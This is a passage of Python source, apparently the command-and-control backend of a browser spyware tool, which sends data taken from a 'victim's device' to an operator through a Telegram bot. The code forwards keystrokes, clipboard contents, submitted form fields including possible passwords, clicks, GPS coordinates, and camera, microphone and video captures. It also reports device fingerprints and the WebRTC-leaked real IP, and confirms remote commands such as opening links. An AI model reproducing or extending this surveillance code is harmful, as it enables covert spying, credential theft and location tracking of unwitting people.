            bot.send_message(chat_id, f"📋 **نسخ:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_cut':
            bot.send_message(chat_id, f"✂️ **قص:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")
        elif dtype == 'clipboard_paste':
            bot.send_message(chat_id, f"📥 **لصق:**\n```\n{data.get('content','')[:300]}\n```", parse_mode="Markdown")

        # ---------- form submit ----------
        elif dtype == 'form_submit':
            form_data = data.get('data', {})
            lines = [f"📝 **نموذج تم إرساله:**", f"Action: `{data.get('action','')[:80]}`"]
            for k, v in list(form_data.items())[:20]:
                lines.append(f"• `{k}`: `{str(v)[:100]}`")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

        # ---------- click tracking ----------
        elif dtype == 'click':
            # إرسال فقط النقرات المهمة (بحسب النص)
            txt = data.get('text', '').strip()
            if txt and len(txt) > 2:
                # تجميع النقرات
                _accumulate_click(chat_id, session_id, txt)

        # ---------- url change ----------
        elif dtype == 'url_change':
            bot.send_message(chat_id, f"🔗 **تغيير رابط:**\n`{data.get('url','')[:200]}`", parse_mode="Markdown")

        # ---------- open_url done ----------
        elif dtype == 'command_open_url_done':
            bot.send_message(chat_id, f"✅ تم فتح الرابط على جهاز الضحية")

        # ---------- notify done ----------
        elif dtype == 'command_notify_done':
            bot.send_message(chat_id, "✅ تم إرسال الإشعار")

        # ---------- vibrate done ----------
        elif dtype == 'command_vibrate_done':
            bot.send_message(chat_id, "✅ تم تفعيل الاهتزاز")

        # ---------- location بأمر ----------
        elif dtype == 'command_location':
            loc = data.get('location') or {}
            if loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(
                    chat_id,
                    f"📍 **الموقع المحدّث:**\n`{lat}, {lng}`\n"
                    f"[فتح في الخرائط](https://maps.google.com/?q={lat},{lng})",
                    parse_mode="Markdown"
                )
            else:
                bot.send_message(chat_id, "❌ تعذّر تحديث الموقع")

        # ---------- ready ----------
        elif dtype == 'ready':
            bot.send_message(chat_id, f"✅ **الجلسة `{session_id[:8]}` جاهزة للتحكم الكامل**")

        # ---------- heartbeat ----------
        elif dtype in ('heartbeat', 'pong'):
            sess = get_session(session_id)
            if sess:
                sess['last_seen'] = time.time()

    except Exception as e:
        print(f"[-] _handle_incoming error ({dtype}): {e}")


# ============================================================
# [8] دوال مساعدة للإرسال
# ============================================================
def _send_photo(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:image'):
            return
        _, encoded = data_url.split(',', 1)
        img_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(img_bytes)
        buf.name = 'capture.jpg'
        bot.send_photo(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_photo error: {e}")


def _send_audio(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:audio'):
            return
        _, encoded = data_url.split(',', 1)
        aud_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(aud_bytes)
        buf.name = 'capture.webm'
        bot.send_audio(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_audio error: {e}")


def _send_video(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:video'):
            return
        _, encoded = data_url.split(',', 1)
        vid_bytes = base64.b64decode(encoded)
        buf = io.BytesIO(vid_bytes)
        buf.name = 'capture.webm'
        bot.send_video(chat_id, buf, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] _send_video error: {e}")


# ---------- تخزين مؤقت للمفاتيح والنقرات ----------
_key_buffers = {}   # { chat_id: {"text": "...", "ts": time} }
_click_buffers = {} # { chat_id: {"texts": [], "ts": time} }


def _accumulate_key(chat_id, session_id, key, data):
    """تجميع ضغطات المفاتيح وإرسال كل 3 ثوان"""
    now = time.time()
    key_map = {
        'Enter': '⏎', 'Backspace': '⌫', 'Delete': '⌦', 'Tab': '⇥',
        'Escape': '⎋', 'ArrowUp': '↑', 'ArrowDown': '↓',
        'ArrowLeft': '←', 'ArrowRight': '→',
    }
    display = key_map.get(key, key)
    buf = _key_buffers.setdefault(chat_id, {"text": "", "last": 0})
    buf["text"] += display

    if now - buf["last"] > 3 or len(buf["text"]) > 200:
        if buf["text"].strip():
            try:
                bot = _BOT_REF
                if bot:
                    bot.send_message(
                        chat_id,
                        f"⌨️ **لوحة المفاتيح:**\n```\n{buf['text'][:500]}\n```",
                        parse_mode="Markdown"
                    )
            except Exception:
                pass
        buf["text"] = ""
        buf["last"] = now


def _accumulate_click(chat_id, session_id, text):
    now = time.time()
    buf = _click_buffers.setdefault(chat_id, {"texts": [], "last": 0})
    buf["texts"].append(text)
    if now - buf["last"] > 5 or len(buf["texts"]) >= 10:
        try:
            bot = _BOT_REF
            if bot and buf["texts"]:
                unique = list(dict.fromkeys(buf["texts"]))[:10]
                bot.send_message(
                    chat_id,
                    "🖱️ **النقرات الأخيرة:**\n" + "\n".join(f"• {t[:80]}" for t in unique),
                    parse_mode="Markdown"
                )
        except Exception:
            pass
        buf["texts"] = []
        buf["last"] = now


_BOT_REF = None


def set_bot_reference(bot):
    """يُستدعى من main.py لضبط مرجع البوت"""
    global _BOT_REF
    _BOT_REF = bot


# ============================================================
# [9] تنسيق تقرير المعلومات الأولي
# ============================================================
def _format_info_report(info, session_id):
    geo = info.get('geolocation') or {}
    bat = info.get('battery') or {}
    net = info.get('connection') or {}
    scr = info.get('screen') or {}
    hw = info.get('hardware') or {}
    gpu = info.get('gpu') or {}
    webrtc = info.get('webrtc_ips', [])
    fonts = info.get('fonts', [])

    ip = info.get('ip', 'Unknown')
    webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"

    report = (
        "╔══════════════════════════════╗\n"
        "║  🎯 **جلسة LSH جديدة**  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🆔 الجلسة: `{session_id}`\n"
        f"🌐 **IP الخارجي:** `{ip}`\n"
        f"🕵️ **IP الحقيقي (WebRTC):** `{webrtc_text}`\n"
        f"🕐 الوقت: `{info.get('timestamp', 'N/A')[:19]}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💻 **الجهاز:**\n"
        f"• المنصة: `{info.get('platform', 'Unknown')}`\n"
        f"• النظام من UA: `{info.get('userAgent', '')[:120]}`\n"
        f"• المعالج: `{hw.get('cores', 'N/A')} أنوية`\n"
        f"• الذاكرة: `{hw.get('memory', 'N/A')} GB`\n"
        f"• اللغة: `{info.get('language', 'N/A')}`\n"
        f"• المنطقة الزمنية: `{info.get('timezone', 'N/A')}`\n"
        f"• الكوكيز مفعلة: `{info.get('cookies_enabled', '?')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 **كرت الرسوميات:**\n"
        f"• `{gpu.get('vendor', 'N/A')}`\n"
        f"• `{gpu.get('renderer', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📐 **الشاشة:**\n"
        f"• `{scr.get('width', '?')}x{scr.get('height', '?')}` "
        f"DPR `{scr.get('pixelRatio', '?')}` "
        f"{scr.get('colorDepth', '?')}-bit\n"
        f"• الاتجاه: `{scr.get('orientation', 'N/A')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 **البطارية:** "
        + (f"`{bat.get('level', '?')}%` | شحن: `{'نعم' if bat.get('charging') else 'لا'}`"
           if bat else "غير متاح") + "\n"
        "📶 **الشبكة:** "
        + (f"`{net.get('effectiveType', '?')}` | ↓ `{net.get('downlink', '?')}` Mbps | RTT `{net.get('rtt', '?')}` ms"
           if net else "غير متاح") + "\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🔤 **الخطوط المكتشفة ({len(fonts)}):**\n"
        f"`{', '.join(fonts[:12])}`"
    )
    return report
